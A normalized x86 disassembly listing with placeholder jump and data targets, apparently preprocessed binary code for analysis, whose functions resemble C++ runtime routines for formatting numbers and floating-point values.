lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x60 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebx - 0x1 ]
push ecx
push edi
push edx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push esi
call sub_1000ab50
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x54 ]
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x30
push ecx
push edx
lea eax [ ebp - 0x74 ]
push eax
push esi
call sub_1000a9f0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp - 0x78 ]
mov edx [ eax + 0x4 ]
add esp 0x34
test [ ecx + 0x14 ] 0x4
mov [ ebp + 0x14 ] edx
mov [ ebp - 0x54 ] 0x0
mov ecx r--data
jne r-xdata
mov eax [ ebp - 0x50 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push esi
call sub_1000a9f0
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push 0x1
push edi
push eax
push ecx
lea edx [ ebp - 0x68 ]
push edx
push esi
call sub_1000a980
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
inc edi
dec ebx
mov [ ebp + 0x14 ] edx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x50 ] 0x0
add esp 0x18
mov eax [ edx + 0x14 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x54 ]
push 0x30
push eax
sub esi edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000af30
mov edx [ ebp - 0x58 ]
push 0x30
push edx
lea ecx [ ebp - 0x2c ]
call sub_1000aaa0
mov [ ebp - 0x58 ] ebx
push 0x30
test ebx ebx
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x1
push ecx
push edx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push esi
call sub_1000a980
mov edx [ eax ]
add edi ebx
add esp 0x18
sub [ ebp - 0x4c ] ebx
mov ebx [ ebp - 0x4c ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov ecx r--data
mov edx [ ebp - 0x6c ]
sub ebx edi
push edx
lea eax [ ebx + 0x1 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000af30
mov ecx [ ebp - 0x58 ]
push 0x30
push ecx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1000af30
mov [ ebp - 0x6c ] 0x0
mov ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1000aaa0
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
lea ebx [ ebp - 0x48 ]
mov ebx [ ebp - 0x48 ]
mov esi 0x10
mov [ ebp - 0x58 ] 0x0
cmp [ ebp - 0x34 ] esi
jae r-xdata
lea edx [ ebp - 0x5c ]
push edx
push eax
call sub_1001aba0
mov edi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
test al al
jle r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4c ] edx
mov ebx edx
lea edi [ ebp - 0x2c ]
mov ecx edi
sub ecx [ ebp - 0x64 ]
movsx eax al
cmp eax ecx
jae r-xdata
push 0x0
sub edi eax
push 0x1
push edi
lea ecx [ ebp - 0x2c ]
call sub_1000af30
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_1000bfd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c950
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x24 ]
mov ebx [ ebp + 0x20 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x30 ] edx
call sub_10009320
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1000b510
mov esi [ ebp - 0x40 ]
add esp 0x4
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x50 ]
call sub_1000abf0
mov al [ ebx ]
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ ebp - 0x34 ]
call sub_10019397
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
mov edi [ esi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x34 ]
not edi
call sub_100193bf
and edi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x3c ]
mov edi [ eax + 0x20 ]
mov ecx eax
cmp [ ecx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ ebp - 0x30 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x40 ] al
mov eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push ebx
push edx
push eax
lea ecx [ ebp - 0x54 ]
push ecx
push esi
call sub_1000ab50
mov ecx [ eax ]
mov edx [ ebp - 0x3c ]
push edi
mov edi [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
mov edx [ ebp + 0x1c ]
push edx
push eax
push ecx
push edi
push esi
mov [ ebp + 0x14 ] eax
call sub_1000a9f0
add esp 0x34
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov edx [ ebp + 0x14 ]
cmp eax 0x100
mov eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x30 ]
cmp edi eax
jbe r-xdata
test edi edi
je r-xdata
cmp ecx 0x10
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x34 ]
push ecx
push ebx
push edx
push eax
lea ecx [ ebp - 0x48 ]
push ecx
push esi
call sub_1000a980
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp + 0x1c ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x34 ]
sub [ ebp - 0x30 ] ecx
push edi
push edx
mov edx [ eax ]
add ebx ecx
mov ecx [ eax + 0x4 ]
push ecx
push edx
lea eax [ ebp - 0x38 ]
push eax
push esi
call sub_1000a9f0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x30
mov [ ebp + 0x14 ] edx
mov ecx [ ebp + 0x1c ]
push edi
push ecx
push edx
push eax
lea ecx [ ebp - 0x38 ]
push ecx
push esi
call sub_1000a9f0
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
jmp r-xdata
sub edi eax
jmp r-xdata
mov esi [ ebp - 0x30 ]
mov eax edx
mov al [ eax ]
mov [ ebp - 0x44 ] edx
cmp al 0x7f
je r-xdata
lea edx [ ebp - 0x2c ]
xor edi edi
mov eax [ ecx + 0x14 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax [ ebp - 0x30 ]
sub eax esi
inc eax
push eax
lea edi [ ebx + esi ]
push edi
push eax
lea edx [ ebx + esi + 0x1 ]
push edx
call sub_1001abe6
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x30 ]
add esp 0x10
mov [ edi ] 0x0
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ ebp - 0x44 ] eax
sub_1000c260
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_10007470
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000c2b0
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_10007470
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000c300
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_10007470
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000c350
push ebp
mov ebp esp
sub esp 0x1c
push edi
mov edi ecx
cmp [ edi + 0x40 ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ edi + 0x1c ]
push 0x1
push esi
mov [ ebp - 0xc ] esi
call sub_1001a8ef
mov ebx eax
add esp 0x8
mov [ ebp - 0x8 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop edi
mov esp ebp
pop ebp
retn
push 0x10
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] eax
xor eax eax
sub [ edi + 0x1c ] esi
pop esi
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov cx [ rw-data ]
mov dl [ rw-data ]
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0x64
mov [ eax + 0x7 ] dl
mov [ eax ] 0x0
sub [ edi + 0x1c ] esi
pop esi
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov esi [ eax + ecx * 4 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
push edx
push ebx
call sub_10019cf0
mov eax [ esi ]
add ebx [ esi + 0x4 ]
push eax
call sub_1001a3eb
mov eax [ edi + 0x40 ]
xor edx edx
add esp 0x10
cmp eax edx
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
dec [ ebp - 0x4 ]
jne r-xdata
mov esi [ edi + 0x38 ]
inc [ edi + 0x3c ]
add esi esi
add esi esi
cmp esi [ edi + 0x3c ]
ja r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ edi + 0x30 ]
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
dec eax
mov [ edi + 0x40 ] eax
cmp eax edx
jne r-xdata
mov [ edi + 0x3c ] edx
mov [ edi + 0x3c ] edx
sub_1000c460
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x8
mov ebx ecx
call sub_1001a818
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov edi [ ebp + 0xc ]
push 0x1
push edi
mov [ ebp - 0x4 ] esi
call sub_1001a8ef
add esp 0x8
mov [ esi ] eax
test eax eax
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov esi eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
call sub_10019cf0
add esp 0xc
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebx + 0x30 ]
mov [ esi + 0x4 ] edi
call sub_1000f6e0
add [ ebx + 0x1c ] edi
sub_1000c4c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c998
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ecx + 0x40 ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov eax [ ecx + 0x24 ]
cmp [ eax ] ebx
je r-xdata
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
lea ecx [ ebp - 0x48 ]
push ecx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] bl
call sub_100076f0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov edx [ ecx + 0x20 ]
cmp [ edx ] ebx
je r-xdata
mov eax [ eax ]
mov edx [ ecx + 0x3c ]
cmp edx eax
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
add eax [ edx ]
mov ecx [ ecx + 0x10 ]
mov ecx [ ecx ]
sub eax ecx
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10007470
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ecx [ ecx + 0x14 ]
mov ecx [ ecx ]
sub eax ecx
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10007470
mov [ ebp - 0x4 ] ebx
mov eax edx
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_100076f0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
call sub_10019ce4
add esp 0x4
sub_1000c5f0
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_1000a2c0
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1001ac39
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_1000bfd0
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x18
sub_1000c670
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_1000a2c0
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1001ac39
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_1000bfd0
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x18
sub_1000c6f0
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_1000a2c0
add esp 0x10
push eax
lea ecx [ ebp - 0x4c ]
push 0x40
push ecx
call sub_1001ac39
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ ebp - 0x4c ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_1000bfd0
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x1c
sub_1000c770
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_1000a2c0
add esp 0x10
push eax
lea ecx [ ebp - 0x4c ]
push 0x40
push ecx
call sub_1001ac39
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ ebp - 0x4c ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_1000bfd0
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x1c
sub_1000c7f0
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebx + 0x18 ]
push edi
mov [ ebp - 0x88 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ ebp - 0x8c ] ecx
cmp eax edi
jg r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
jl r-xdata
mov [ ebp - 0x84 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp esi edi
ja r-xdata
mov [ ebp - 0xc ] 0x25
lea eax [ ebp - 0xb ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x84 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
test dl 0x10
je r-xdata
mov [ ebp - 0xb ] 0x2b
lea eax [ ebp - 0xa ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x84 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ ebp - 0x80 ] edi
cmp eax 0x2000
jne r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x2 ] cl
fstp [ esp ]
mov ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ eax + 0x3 ] 0x0
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1001ac39
mov ecx [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp - 0x88 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x78 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_1000ba60
mov ecx [ ebp - 0x4 ]
add esp 0x44
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add [ ebp - 0x80 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_1000ca00
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebx + 0x18 ]
push edi
mov [ ebp - 0x88 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ ebp - 0x8c ] ecx
cmp eax edi
jg r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
jl r-xdata
mov [ ebp - 0x84 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp esi edi
ja r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x84 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
test dl 0x10
je r-xdata
mov [ ebp - 0xb ] 0x2b
lea eax [ ebp - 0xa ]
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x84 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ ebp - 0x80 ] edi
cmp eax 0x2000
jne r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x3 ] cl
fstp [ esp ]
mov ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ eax + 0x4 ] 0x0
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1001ac39
mov ecx [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp - 0x88 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x78 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_1000ba60
mov ecx [ ebp - 0x4 ]
add esp 0x44
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
mov [ ebp - 0xc ] 0x25
lea eax [ ebp - 0xb ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_1000cc00
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov edi ecx
call sub_1001ac39
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push esi
push edi
call sub_1000bfd0
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn 0x18
sub_1000cc60
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c9d9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov esi [ ebp + 0x8 ]
